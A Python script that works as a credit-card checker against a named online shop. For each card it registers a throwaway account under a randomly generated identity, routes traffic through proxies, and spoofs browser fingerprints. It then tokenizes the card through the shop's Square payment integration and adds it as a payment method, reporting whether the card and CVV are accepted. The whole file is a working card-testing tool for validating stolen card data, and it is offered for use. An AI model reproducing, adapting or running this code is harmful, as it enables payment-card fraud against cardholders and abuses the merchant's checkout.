
import base64
from bs4 import BeautifulSoup
import random
import urllib.parse
import aiohttp
import asyncio
import json as jsondecode
import names
import platform
import html
import ssl
import certifi
import names
import random_address

genaddr = random_address.real_random_address()
address = genaddr['address1']
try: 
    City = genaddr['city']
except KeyError:
    City = "FL"
State = genaddr['state']
Zip_Code = genaddr['postalCode']
first = names.get_first_name()
last = names.get_last_name()
if platform.system()=='Windows':
    asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())

CorreoRand = f"{names.get_first_name()}{names.get_last_name()}{random.randint(10000,999999)}@gmail.com"

async def ChaseAuth(cc, proxyrand):
    timeout=20
    ssl_context = ssl.create_default_context(cafile=certifi.where())
    conn = aiohttp.TCPConnector(ssl=ssl_context)
    async with aiohttp.ClientSession(connector=conn) as session:
        splitter = cc.split('|')
        ccnum    = splitter[0]
        mes      = splitter[1]
        ano      = splitter[2]
        cvv      = splitter[3]

        max_retries = 3
        retry_delay = 1
        for retry in range(max_retries):
            try:
                #---------------------------------REQUEST NUMERO 1------------------------------#
                #---------------------------------REQUEST NUMERO 1------------------------------#        
                session.headers.update({
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:101.0) Gecko/20100101 Firefox/101.0',
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
                    'Accept-Language': 'es-MX,es;q=0.8,en-US;q=0.5,en;q=0.3',
                })
                try:
                    async with session.get(url='https://www.theorganicbunny.com/my-account/', proxy=str(proxyrand), timeout=timeout) as resp:          
                        response = await resp.text()
                        woo_regi = (BeautifulSoup(response , 'lxml')).find_all("input", {"name": "woocommerce-register-nonce"})[0]["value"]
                except UnboundLocalError :
                    return 'An unexpected error occurred in request 01. It was not generated correctly [UnboundLocalError]. ♻️'  
                except TypeError :
                    return 'An unexpected error occurred in request 01. It was not generated correctly [TypeError]. ♻️'
                except KeyError :
                    return 'An unexpected error occurred in request 01. It was not generated correctly [KeyError]. ♻️'
                except aiohttp.client_exceptions.ClientHttpProxyError as e:
                    print(f"Error al conectarse {retry+1}/{max_retries}: {e}")
                    if retry < max_retries-1:
                        print(f"Reintentando en {retry_delay} segundo...")
                        await asyncio.sleep(retry_delay)
                    else:
                        print(f"No se pudo conectar después de {max_retries} intentos.") 
                        return "Maximum number of retries reached: 3"
                #---------------------------------REQUEST NUMERO 2------------------------------#
                #---------------------------------REQUEST NUMERO 2------------------------------#
                CorreoRand = f"{names.get_first_name()}{names.get_last_name()}{random.randint(1000,9999999)}@gmail.com"
                try :
                    data = {
                        #'username': f"{names.get_first_name()}{names.get_last_name()}{random.randint(10000,999999)}",
                        'email': CorreoRand,
                        'password': 'XR7EsCDzb2G7NEm',
                        'yith_birthday': '',
                        'woocommerce-register-nonce': woo_regi,
                        '_wp_http_referer': '/my-account/',
                        'register': 'Register',
                    }
                    async with session.post('https://www.theorganicbunny.com/my-account/', data=data, proxy=str(proxyrand), timeout=timeout) as resp:       
                        response = await resp.text()
                except UnboundLocalError :
                    return 'An unexpected error occurred in request 02. It was not generated correctly [TypeError]. ♻️'
                except TypeError :
                    return 'An unexpected error occurred in request 02. It was not generated correctly [TypeError]. ♻️'
                except KeyError :
                    return 'An unexpected error occurred in request 02. It was not generated correctly [KeyError]. ♻️'
                except aiohttp.client_exceptions.ClientHttpProxyError as e:
                    print(f"Error al conectarse {retry+1}/{max_retries}: {e}")
                    if retry < max_retries-1:
                        print(f"Reintentando en {retry_delay} segundo...")
                        await asyncio.sleep(retry_delay)
                    else:
                        print(f"No se pudo conectar después de {max_retries} intentos.") 
                        return "Maximum number of retries reached: 3"
                #---------------------------------REQUEST NUMERO 3------------------------------#
                #---------------------------------REQUEST NUMERO 3------------------------------#
                try :
                    headers = {
                        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/111.0',
                        'Accept': 'application/json',
                        'Accept-Language': 'es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3',
                        # 'Accept-Encoding': 'gzip, deflate, br',
                        'Referer': 'https://web.squarecdn.com/',
                        'content-type': 'application/json; charset=utf-8',
                        'Origin': 'https://web.squarecdn.com',
                        'Connection': 'keep-alive',
                        # 'Cookie': '_savt=cfe0a943-c00c-4a63-9889-c4a609ec5c91',
                        'Sec-Fetch-Dest': 'empty',
                        'Sec-Fetch-Mode': 'cors',
                        'Sec-Fetch-Site': 'cross-site',
                        # Requests doesn't support trailers
                        # 'TE': 'trailers',
                    }
                    async with session.get('https://pci-connect.squareup.com/payments/hydrate?applicationId=sq0idp-wGVapF8sNt9PLrdj5znuKA&hostname=www.theorganicbunny.com&locationId=EY2Y8WDK785A1&version=1.46.0', proxy=str(proxyrand), timeout=timeout) as resp:
                        response = await resp.json()
                        sessionId = response['sessionId']
                except UnboundLocalError :
                    return 'An unexpected error occurred in request 03. It was not generated correctly [UnboundLocalError]. ♻️'  
                except TypeError :
                    print(f"Error al conectarse {retry+1}/{max_retries}: {e}")
                    if retry < max_retries-1:
                        print(f"Reintentando en {retry_delay} segundo...")
                        await asyncio.sleep(retry_delay)
                    else:
                        print(f"No se pudo conectar después de {max_retries} intentos.") 
                        return "Maximum number of retries reached: 3"
                except KeyError :
                    return 'An unexpected error occurred in request 03. It was not generated correctly [KeyError]. ♻️'
                except aiohttp.client_exceptions.ClientHttpProxyError as e:
                    print(f"Error al conectarse {retry+1}/{max_retries}: {e}")
                    if retry < max_retries-1:
                        print(f"Reintentando en {retry_delay} segundo...")
                        await asyncio.sleep(retry_delay)
                    else:
                        print(f"No se pudo conectar después de {max_retries} intentos.") 
                        return "Maximum number of retries reached: 3"

                #---------------------------------REQUEST NUMERO 4------------------------------#
                #---------------------------------REQUEST NUMERO 4------------------------------#
                try :  
                    json_data = {
                        'components': '{"user_agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/111.0","language":"es-ES","color_depth":24,"resolution":[1920,1080],"available_resolution":[1920,1040],"timezone_offset":300,"session_storage":1,"local_storage":1,"cpu_class":"unknown","navigator_platform":"Win32","do_not_track":"unspecified","regular_plugins":["PDF Viewer::Portable Document Format::application/pdf~pdf,text/pdf~pdf","Chrome PDF Viewer::Portable Document Format::application/pdf~pdf,text/pdf~pdf","Chromium PDF Viewer::Portable Document Format::application/pdf~pdf,text/pdf~pdf","Microsoft Edge PDF Viewer::Portable Document Format::application/pdf~pdf,text/pdf~pdf","WebKit built-in PDF::Portable Document Format::application/pdf~pdf,text/pdf~pdf"],"adblock":false,"has_lied_languages":false,"has_lied_resolution":false,"has_lied_os":false,"has_lied_browser":false,"touch_support":[0,false,false],"js_fonts":["Arial","Arial Black","Arial Narrow","Arial Rounded MT Bold","Book Antiqua","Bookman Old Style","Calibri","Cambria","Cambria Math","Century","Century Gothic","Century Schoolbook","Comic Sans MS","Consolas","Courier","Courier New","Garamond","Georgia","Helvetica","Impact","Lucida Bright","Lucida Calligraphy","Lucida Console","Lucida Fax","Lucida Handwriting","Lucida Sans","Lucida Sans Typewriter","Lucida Sans Unicode","Microsoft Sans Serif","Monotype Corsiva","MS Gothic","MS Outlook","MS PGothic","MS Reference Sans Serif","MS Sans Serif","MS Serif","Palatino Linotype","Segoe Print","Segoe Script","Segoe UI","Segoe UI Light","Segoe UI Semibold","Segoe UI Symbol","Tahoma","Times","Times New Roman","Trebuchet MS","Verdana","Wingdings","Wingdings 2","Wingdings 3"]}',
                        'fingerprint': '2a3e3d0fe56cd8d2d5a7fb77b88550f6',
                        'timezone': '300',
                        'user_agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/111.0',
                        'version': '9bdd7a57c9f6b44e8a5ff05976cf564bb2e2e828',
                        'website_url': 'https://www.theorganicbunny.com/',
                        'client_id': 'sq0idp-wGVapF8sNt9PLrdj5znuKA',
                        'browser_fingerprint_by_version': [
                            {
                                'payload_json': '{"components":{"user_agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/111.0","language":"es-ES","color_depth":24,"resolution":[1920,1080],"available_resolution":[1920,1040],"timezone_offset":300,"session_storage":1,"local_storage":1,"cpu_class":"unknown","navigator_platform":"Win32","do_not_track":"unspecified","regular_plugins":["PDF Viewer::Portable Document Format::application/pdf~pdf,text/pdf~pdf","Chrome PDF Viewer::Portable Document Format::application/pdf~pdf,text/pdf~pdf","Chromium PDF Viewer::Portable Document Format::application/pdf~pdf,text/pdf~pdf","Microsoft Edge PDF Viewer::Portable Document Format::application/pdf~pdf,text/pdf~pdf","WebKit built-in PDF::Portable Document Format::application/pdf~pdf,text/pdf~pdf"],"adblock":false,"has_lied_languages":false,"has_lied_resolution":false,"has_lied_os":false,"has_lied_browser":false,"touch_support":[0,false,false],"js_fonts":["Arial","Arial Black","Arial Narrow","Arial Rounded MT Bold","Book Antiqua","Bookman Old Style","Calibri","Cambria","Cambria Math","Century","Century Gothic","Century Schoolbook","Comic Sans MS","Consolas","Courier","Courier New","Garamond","Georgia","Helvetica","Impact","Lucida Bright","Lucida Calligraphy","Lucida Console","Lucida Fax","Lucida Handwriting","Lucida Sans","Lucida Sans Typewriter","Lucida Sans Unicode","Microsoft Sans Serif","Monotype Corsiva","MS Gothic","MS Outlook","MS PGothic","MS Reference Sans Serif","MS Sans Serif","MS Serif","Palatino Linotype","Segoe Print","Segoe Script","Segoe UI","Segoe UI Light","Segoe UI Semibold","Segoe UI Symbol","Tahoma","Times","Times New Roman","Trebuchet MS","Verdana","Wingdings","Wingdings 2","Wingdings 3"]},"fingerprint":"2a3e3d0fe56cd8d2d5a7fb77b88550f6"}',
                                'payload_type': 'fingerprint-v1',
                            },
                            {
                                'payload_json': '{"components":{"language":"es-ES","color_depth":24,"resolution":[1920,1080],"available_resolution":[1920,1040],"timezone_offset":300,"session_storage":1,"local_storage":1,"cpu_class":"unknown","navigator_platform":"Win32","do_not_track":"unspecified","regular_plugins":["PDF Viewer::Portable Document Format::application/pdf~pdf,text/pdf~pdf","Chrome PDF Viewer::Portable Document Format::application/pdf~pdf,text/pdf~pdf","Chromium PDF Viewer::Portable Document Format::application/pdf~pdf,text/pdf~pdf","Microsoft Edge PDF Viewer::Portable Document Format::application/pdf~pdf,text/pdf~pdf","WebKit built-in PDF::Portable Document Format::application/pdf~pdf,text/pdf~pdf"],"adblock":false,"has_lied_languages":false,"has_lied_resolution":false,"has_lied_os":false,"has_lied_browser":false,"touch_support":[0,false,false],"js_fonts":["Arial","Arial Black","Arial Narrow","Arial Rounded MT Bold","Book Antiqua","Bookman Old Style","Calibri","Cambria","Cambria Math","Century","Century Gothic","Century Schoolbook","Comic Sans MS","Consolas","Courier","Courier New","Garamond","Georgia","Helvetica","Impact","Lucida Bright","Lucida Calligraphy","Lucida Console","Lucida Fax","Lucida Handwriting","Lucida Sans","Lucida Sans Typewriter","Lucida Sans Unicode","Microsoft Sans Serif","Monotype Corsiva","MS Gothic","MS Outlook","MS PGothic","MS Reference Sans Serif","MS Sans Serif","MS Serif","Palatino Linotype","Segoe Print","Segoe Script","Segoe UI","Segoe UI Light","Segoe UI Semibold","Segoe UI Symbol","Tahoma","Times","Times New Roman","Trebuchet MS","Verdana","Wingdings","Wingdings 2","Wingdings 3"]},"fingerprint":"00d7533fb343e3fd354adb899d6340db"}',
                                'payload_type': 'fingerprint-v1-sans-ua',
                            },
                        ],
                    }
                    async with session.post('https://connect.squareup.com/v2/analytics/token', json=json_data, proxy=str(proxyrand), timeout=timeout) as resp:
                        response = await resp.json()
                        token = response['token']
                except UnboundLocalError :
                    return 'An unexpected error occurred in request 04. It was not generated correctly [UnboundLocalError]. ♻️'  
                except TypeError :
                    return 'An unexpected error occurred in request 04. It was not generated correctly [TypeError]. ♻️'
                except KeyError :
                    return 'An unexpected error occurred in request 04. It was not generated correctly [KeyError]. ♻️'
                except aiohttp.client_exceptions.ClientHttpProxyError as e:
                    print(f"Error al conectarse {retry+1}/{max_retries}: {e}")
                    if retry < max_retries-1:
                        print(f"Reintentando en {retry_delay} segundo...")
                        await asyncio.sleep(retry_delay)
                    else:
                        print(f"No se pudo conectar después de {max_retries} intentos.") 
                        return "Maximum number of retries reached: 3"
                #---------------------------------REQUEST NUMERO 5------------------------------#
                #---------------------------------REQUEST NUMERO 5------------------------------#
                try :
                    if mes[0:1] == '1': mesnew = mes
                    else : mesnew = mes[1:2]
                    json_data = {
                        'client_id': 'sq0idp-wGVapF8sNt9PLrdj5znuKA',
                        'location_id': 'EY2Y8WDK785A1',
                        'payment_method_tracking_id': '1d605040-eee4-c5ff-bd88-6ff7566c8b83',
                        'session_id': sessionId,
                        'website_url': 'www.theorganicbunny.com',
                        'analytics_token': token,
                        'card_data': {
                            'billing_postal_code': Zip_Code,
                            'cvv': cvv,
                            'exp_month': int(mesnew),
                            'exp_year': int(ano),
                            'number': ccnum,
                        },
                    }
                    async with session.post('https://pci-connect.squareup.com/v2/card-nonce?_=1679097230974.5981&version=1.46.0', json=json_data, proxy=str(proxyrand), timeout=timeout) as resp:
                        response = await resp.json()
                        card_nonce = response['card_nonce']
                        card_brand = response['card']['card_brand']
                        last_4 = response['card']['last_4']
                except UnboundLocalError :
                    return 'An unexpected error occurred in request 05. It was not generated correctly [UnboundLocalError]. ♻️'  
                except TypeError :
                    return 'An unexpected error occurred in request 05. It was not generated correctly [TypeError]. ♻️'
                except KeyError :
                    return 'An unexpected error occurred in request 05. It was not generated correctly [KeyError]. ♻️'
                except aiohttp.client_exceptions.ClientHttpProxyError as e:
                    print(f"Error al conectarse {retry+1}/{max_retries}: {e}")
                    if retry < max_retries-1:
                        print(f"Reintentando en {retry_delay} segundo...")
                        await asyncio.sleep(retry_delay)
                    else:
                        print(f"No se pudo conectar después de {max_retries} intentos.") 
                        return "Maximum number of retries reached: 3"
                #---------------------------------REQUEST NUMERO 6------------------------------#
                #---------------------------------REQUEST NUMERO 6------------------------------#
                try:
                    async with session.get('https://www.theorganicbunny.com/my-account/add-payment-method/', proxy=str(proxyrand), timeout=timeout) as resp:
                        response = await resp.text()
                        noncewoo2 = (BeautifulSoup(response , 'lxml')).find("input", {"name": "woocommerce-add-payment-method-nonce"})["value"]    
                except UnboundLocalError :
                    return 'An unexpected error occurred in request 06. It was not generated correctly [UnboundLocalError]. ♻️'   
                except TypeError :
                    return 'An unexpected error occurred in request 06. It was not generated correctly [TypeError]. ♻️'
                except KeyError :
                    return 'An unexpected error occurred in request 06. It was not generated correctly [KeyError]. ♻️'
                except aiohttp.client_exceptions.ClientHttpProxyError as e:
                    print(f"Error al conectarse {retry+1}/{max_retries}: {e}")
                    if retry < max_retries-1:
                        print(f"Reintentando en {retry_delay} segundo...")
                        await asyncio.sleep(retry_delay)
                    else:
                        print(f"No se pudo conectar después de {max_retries} intentos.") 
                        return "Maximum number of retries reached: 3" 
                #---------------------------------REQUEST NUMERO 7------------------------------#
                #---------------------------------REQUEST NUMERO 7------------------------------#
                try :  
                    json_data = {
                        'browser_fingerprint_by_version': [
                            {
                                'payload_json': '{"components":{"user_agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/111.0","language":"es-ES","color_depth":24,"resolution":[1920,1080],"available_resolution":[1920,1040],"timezone_offset":300,"session_storage":1,"local_storage":1,"cpu_class":"unknown","navigator_platform":"Win32","do_not_track":"unspecified","regular_plugins":["PDF Viewer::Portable Document Format::application/pdf~pdf,text/pdf~pdf","Chrome PDF Viewer::Portable Document Format::application/pdf~pdf,text/pdf~pdf","Chromium PDF Viewer::Portable Document Format::application/pdf~pdf,text/pdf~pdf","Microsoft Edge PDF Viewer::Portable Document Format::application/pdf~pdf,text/pdf~pdf","WebKit built-in PDF::Portable Document Format::application/pdf~pdf,text/pdf~pdf"],"adblock":false,"has_lied_languages":false,"has_lied_resolution":false,"has_lied_os":false,"has_lied_browser":false,"touch_support":[0,false,false],"js_fonts":["Arial","Arial Black","Arial Narrow","Arial Rounded MT Bold","Book Antiqua","Bookman Old Style","Calibri","Cambria","Cambria Math","Century","Century Gothic","Century Schoolbook","Comic Sans MS","Consolas","Courier","Courier New","Garamond","Georgia","Helvetica","Impact","Lucida Bright","Lucida Calligraphy","Lucida Console","Lucida Fax","Lucida Handwriting","Lucida Sans","Lucida Sans Typewriter","Lucida Sans Unicode","Microsoft Sans Serif","Monotype Corsiva","MS Gothic","MS Outlook","MS PGothic","MS Reference Sans Serif","MS Sans Serif","MS Serif","Palatino Linotype","Segoe Print","Segoe Script","Segoe UI","Segoe UI Light","Segoe UI Semibold","Segoe UI Symbol","Tahoma","Times","Times New Roman","Trebuchet MS","Verdana","Wingdings","Wingdings 2","Wingdings 3"]},"fingerprint":"2a3e3d0fe56cd8d2d5a7fb77b88550f6"}',
                                'payload_type': 'fingerprint-v1',
                            },
                            {
                                'payload_json': '{"components":{"language":"es-ES","color_depth":24,"resolution":[1920,1080],"available_resolution":[1920,1040],"timezone_offset":300,"session_storage":1,"local_storage":1,"cpu_class":"unknown","navigator_platform":"Win32","do_not_track":"unspecified","regular_plugins":["PDF Viewer::Portable Document Format::application/pdf~pdf,text/pdf~pdf","Chrome PDF Viewer::Portable Document Format::application/pdf~pdf,text/pdf~pdf","Chromium PDF Viewer::Portable Document Format::application/pdf~pdf,text/pdf~pdf","Microsoft Edge PDF Viewer::Portable Document Format::application/pdf~pdf,text/pdf~pdf","WebKit built-in PDF::Portable Document Format::application/pdf~pdf,text/pdf~pdf"],"adblock":false,"has_lied_languages":false,"has_lied_resolution":false,"has_lied_os":false,"has_lied_browser":false,"touch_support":[0,false,false],"js_fonts":["Arial","Arial Black","Arial Narrow","Arial Rounded MT Bold","Book Antiqua","Bookman Old Style","Calibri","Cambria","Cambria Math","Century","Century Gothic","Century Schoolbook","Comic Sans MS","Consolas","Courier","Courier New","Garamond","Georgia","Helvetica","Impact","Lucida Bright","Lucida Calligraphy","Lucida Console","Lucida Fax","Lucida Handwriting","Lucida Sans","Lucida Sans Typewriter","Lucida Sans Unicode","Microsoft Sans Serif","Monotype Corsiva","MS Gothic","MS Outlook","MS PGothic","MS Reference Sans Serif","MS Sans Serif","MS Serif","Palatino Linotype","Segoe Print","Segoe Script","Segoe UI","Segoe UI Light","Segoe UI Semibold","Segoe UI Symbol","Tahoma","Times","Times New Roman","Trebuchet MS","Verdana","Wingdings","Wingdings 2","Wingdings 3"]},"fingerprint":"00d7533fb343e3fd354adb899d6340db"}',
                                'payload_type': 'fingerprint-v1-sans-ua',
                            },
                        ],
                        'browser_profile': {
                            'components': '{"user_agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/111.0","language":"es-ES","color_depth":24,"resolution":[1920,1080],"available_resolution":[1920,1040],"timezone_offset":300,"session_storage":1,"local_storage":1,"cpu_class":"unknown","navigator_platform":"Win32","do_not_track":"unspecified","regular_plugins":["PDF Viewer::Portable Document Format::application/pdf~pdf,text/pdf~pdf","Chrome PDF Viewer::Portable Document Format::application/pdf~pdf,text/pdf~pdf","Chromium PDF Viewer::Portable Document Format::application/pdf~pdf,text/pdf~pdf","Microsoft Edge PDF Viewer::Portable Document Format::application/pdf~pdf,text/pdf~pdf","WebKit built-in PDF::Portable Document Format::application/pdf~pdf,text/pdf~pdf"],"adblock":false,"has_lied_languages":false,"has_lied_resolution":false,"has_lied_os":false,"has_lied_browser":false,"touch_support":[0,false,false],"js_fonts":["Arial","Arial Black","Arial Narrow","Arial Rounded MT Bold","Book Antiqua","Bookman Old Style","Calibri","Cambria","Cambria Math","Century","Century Gothic","Century Schoolbook","Comic Sans MS","Consolas","Courier","Courier New","Garamond","Georgia","Helvetica","Impact","Lucida Bright","Lucida Calligraphy","Lucida Console","Lucida Fax","Lucida Handwriting","Lucida Sans","Lucida Sans Typewriter","Lucida Sans Unicode","Microsoft Sans Serif","Monotype Corsiva","MS Gothic","MS Outlook","MS PGothic","MS Reference Sans Serif","MS Sans Serif","MS Serif","Palatino Linotype","Segoe Print","Segoe Script","Segoe UI","Segoe UI Light","Segoe UI Semibold","Segoe UI Symbol","Tahoma","Times","Times New Roman","Trebuchet MS","Verdana","Wingdings","Wingdings 2","Wingdings 3"]}',
                            'fingerprint': '2a3e3d0fe56cd8d2d5a7fb77b88550f6',
                            'timezone': '300',
                            'user_agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/111.0',
                            'version': '9bdd7a57c9f6b44e8a5ff05976cf564bb2e2e828',
                            'website_url': 'https://www.theorganicbunny.com/',
                        },
                        'client_id': 'sq0idp-wGVapF8sNt9PLrdj5znuKA',
                        'payment_source': card_nonce,
                        'universal_token': {
                            'token': 'EY2Y8WDK785A1',
                            'type': 'UNIT',
                        },
                        'verification_details': {
                            'billing_contact': {
                                'address_lines': [
                                    '',
                                    '',
                                ],
                                'city': '',
                                'country': 'US',
                                'email': CorreoRand,
                                'family_name': '',
                                'given_name': '',
                                'phone': '',
                                'postal_code': '',
                                'region': 'WA',
                            },
                            'intent': 'STORE',
                        },
                    }
                    async with session.post('https://connect.squareup.com/v2/analytics/verifications', json=json_data, proxy=str(proxyrand), timeout=timeout) as resp:
                        response = await resp.json()
                        verfnonce = response['token']
                except UnboundLocalError :
                    return 'An unexpected error occurred in request 07. It was not generated correctly [UnboundLocalError]. ♻️'  
                except TypeError :
                    return 'An unexpected error occurred in request 07. It was not generated correctly [TypeError]. ♻️'
                except KeyError :
                    return 'An unexpected error occurred in request 07. It was not generated correctly [KeyError]. ♻️'
                except aiohttp.client_exceptions.ClientHttpProxyError as e:
                    print(f"Error al conectarse {retry+1}/{max_retries}: {e}")
                    if retry < max_retries-1:
                        print(f"Reintentando en {retry_delay} segundo...")
                        await asyncio.sleep(retry_delay)
                    else:
                        print(f"No se pudo conectar después de {max_retries} intentos.") 
                        return "Maximum number of retries reached: 3"   
                #---------------------------------REQUEST NUMERO 8------------------------------#
                #---------------------------------REQUEST NUMERO 8------------------------------#
                try:
                    data = {
                        'authnet-card-number': '',
                        'authnet-card-expiry': '',
                        'authnet-card-cvc': '',
                        'payment_method': 'square_credit_card',
                        'wc-square-credit-card-card-type': card_brand,
                        'wc-square-credit-card-last-four': last_4,
                        'wc-square-credit-card-exp-month': mesnew,
                        'wc-square-credit-card-exp-year': ano,
                        'wc-square-credit-card-payment-nonce': card_nonce,
                        'wc-square-credit-card-payment-postcode': Zip_Code,
                        'wc-square-credit-card-buyer-verification-token': verfnonce,
                        'wc-square-credit-card-amount': '',
                        'wc-square-credit-card-tokenize-payment-method': 'true',
                        'woocommerce-add-payment-method-nonce': noncewoo2,
                        '_wp_http_referer': '/my-account/add-payment-method/',
                        'woocommerce_add_payment_method': '1',
                        'nds-pmd': '{"jvqtrgQngn":{"oq":"792:927:1936:1056:1920:1040","wfi":"flap-1","ji":"2.3.1","oc":"2501pp0s72219oop","fe":"1080k1920 24","qvqgm":"300","jxe":124774,"syi":"snyfr","si":"si,btt,zc4,jroz","sn":"sn,zcrt,btt,jni","us":"262pp79s6362q93o","cy":"Jva32","sg":"{\\"zgc\\":0,\\"gf\\":snyfr,\\"gr\\":snyfr}","sp":"{\\"gp\\":gehr,\\"ap\\":gehr}","sf":"gehr","jt":"540os5rn8p7q7q22","sz":"soq955n35poq4921","vce":"apvc,0,6414sq85,2,1;fg,0,,0,vachg_2_1,0;zz,3,101,2s0,cnlzrag;zzf,3s0,0,n,3sq o59,9p4 166q,3n6,3np,-79qp,-797q,-1o0n;zzf,3s6,3s6,n,ABC;zzf,3s3,3s3,n,ABC;zzf,3s4,3s4,n,ABC;zzf,3rq,3rq,n,ABC;zzf,3s4,3s4,n,ABC;zz,395,131,295,fvatyr-pneq-jenccre-1onr9qr7-2o82-5s6q-p659-s5885363o309;zzf,60,3s5,n,265 8qq,265 8qq,ro,s0,5n09,5n09,901;zzf,3sn,3sn,n,17r 2n8,1p9o 16s,484,499,-94q2,p0n5,-830;zzf,3rq,3rq,n,95p 183p,95p 183p,299,299,103p4,103p4,19sn;zp,163,1nr,300,cynpr_beqre;zzf,291,3s4,n,169 5p,31q8 o9,93n,946,-13n6n,1r3sp,-194q;","vp":"0,qr;","ns":"","qvg":""},"jg":"1.j-952168.1.2.64XTsSE2GTmGZUdwG6zIwN,,.Fx79zjttqrQZmN8KIFtIVJvmu83AM2Q2DyWJ7lJ3ATo5cTACW_uYQGun1hFFncw_5eLuXKj_FTIhtux92gnNEdCsEZgxb3fcxnwnnXrIdxE3wvCgdeAKaB9dEW_pFx-zfw0rGI5iJmfvN6YW4ZvN55dP7itCcnccBz7wffqDj3Hy9_VG5rjspOoyvMXLYyCfb44NUfi7d-31V_-Y0EzknhSoRj3L6WRmhceR_RFIuO5iKCU4KwuNpo9OrD2-1rGQ"}',
                    }
                    async with session.post('https://www.theorganicbunny.com/my-account/add-payment-method/', data=data, proxy=str(proxyrand), timeout=timeout) as resp:
                        response = await resp.text()
                except UnboundLocalError as e:
                    return 'An unexpected error occurred in request 08. It was not generated correctly [KeyError]. ♻️'   
                except KeyError :
                    return 'An unexpected error occurred in request 08. It was not generated correctly [KeyError]. ♻️'
                except TypeError :
                    return 'An unexpected error occurred in request 08. It was not generated correctly [TypeError]. ♻️'
                except aiohttp.client_exceptions.ClientHttpProxyError as e:
                    print(f"Error al conectarse {retry+1}/{max_retries}: {e}")
                    if retry < max_retries-1:
                        print(f"Reintentando en {retry_delay} segundo...")
                        await asyncio.sleep(retry_delay)
                    else:
                        print(f"No se pudo conectar después de {max_retries} intentos.") 
                        return "Maximum number of retries reached: 3"  
                #------------ ---------------------CHECCK REQUESTS------------------------------#
                if (int(response.find('New payment method added')) > 0) :
                    return "Approved", "CVV_MATCHED"
                elif int(response.find('INVALID_CARD_DATA')) > 0 :
                    return "CVV_NOT_MATCHED"
                elif int(response.find('Status code')) > 0 :
                    for i in response.split("\n"):
                        if 'Status code ' in i:
                            Message = i.replace(f'\t\t\tStatus code ',"").replace("\t\t</li>","").replace(": "," ")
                    return Message
                else :
                    return "An unexpected error occurred in response. It was not generated correctly. ⚠️"
            except (aiohttp.client_exceptions.ServerDisconnectedError):
                return "An unexpected error occurred. ServerDisconnectedError. ♻️"
            except (asyncio.exceptions.TimeoutError):
                return "An unexpected error occurred. Timeout Error. ♻️"
            except (aiohttp.client_exceptions.ClientConnectorError):
                return "An unexpected error occurred. ClientConnectorError. ♻️"
            finally:
                 await session.close()